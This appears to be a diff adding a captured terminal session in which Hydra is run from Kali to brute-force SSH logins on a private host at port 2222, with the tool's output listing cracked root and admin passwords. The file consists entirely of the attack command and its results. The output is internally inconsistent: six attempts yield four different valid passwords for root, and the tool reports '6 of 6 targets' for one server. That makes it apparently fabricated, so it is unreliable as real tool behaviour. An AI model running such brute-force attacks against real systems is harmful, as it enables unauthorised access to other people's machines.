@@ -1,0 +1,14 @@
+kali@kali:~$ hydra -L users.txt -P passwords.txt ssh://10.47.153.65:2222 -t 6
+Hydra v9.5 (c) 2023 by van Hauser/THC - Please do not use in military or secret service organizations.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-07 07:00:40
+[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries
+[DATA] attacking ssh://10.47.153.65:2222/
+[2222][ssh] host: 10.47.153.65   login: root   password: 123456
+[2222][ssh] host: 10.47.153.65   login: root   password: password
+[2222][ssh] host: 10.47.153.65   login: root   password: toor
+[2222][ssh] host: 10.47.153.65   login: admin   password: admin
+[2222][ssh] host: 10.47.153.65   login: admin   password: 12345
+[2222][ssh] host: 10.47.153.65   login: root   password: hunter2
+6 of 6 targets successfully completed, 6 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-07 07:00:40
